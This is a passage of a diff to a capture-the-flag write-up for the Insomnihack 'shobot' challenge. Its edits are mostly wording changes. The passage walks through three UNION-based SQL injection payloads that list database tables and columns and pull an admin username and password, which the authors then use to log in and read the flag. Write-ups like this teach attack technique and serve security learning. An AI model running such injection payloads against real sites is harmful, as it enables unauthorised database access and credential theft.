@@ -137,32 +137,32 @@ web server really returned our values, and with other values it did not work
 
 From here, it was more or less a straightforward SQLi:
 
-1. Finding the right table:
+- 1. Finding the right table:
 
 ```
 artid=' AND 1=2 UNION SELECT 1,2,3,TABLE_NAME,5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%user%' ORDER BY rand(); -- x"
 ```
 
-2. Finding the right columns:
+- 2. Finding the right columns:
 
 ```
 artid=' AND 1=2 UNION SELECT 1,2,3,COLUMN_NAME,5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME =
 'shbt_user' ORDER BY rand(); -- x
 ```
 
-3. Extracting the admin's username and pw: 
+- 3. Extracting the admin's username and pw: 
 
 ```
 artid=' AND 1=2 UNION SELECT 1,2,3,shbt_userpassword,shbt_username FROM shbt_user ORDER BY rand(); -- x"}
 ```
 
 Which gave us *sh0b0t4dm1n* with the pw *N0T0R0B0TS$L4V3Ry* of the columns
-*shbt_username* and *shbt_userpasswordin* in the table *shbt_user*. Note that we
-used, for convenience reasons, *ORDER BY rand()* in our injections. Luckily we
+*shbt_username* and *shbt_userpassword* in the table *shbt_user*. Note, that we
+used, for convenience, *ORDER BY rand()* in our injections. Luckily we
 did not need many tries ;)
 
 Now, we just navigated to the admin's login page
-(http://shobot.teaser.insomnihack.ch/?page=admin), which was stated also in the
+(http://shobot.teaser.insomnihack.ch/?page=admin), which was also stated in the
 page's source and read the flag on the web page :)
 
 ```
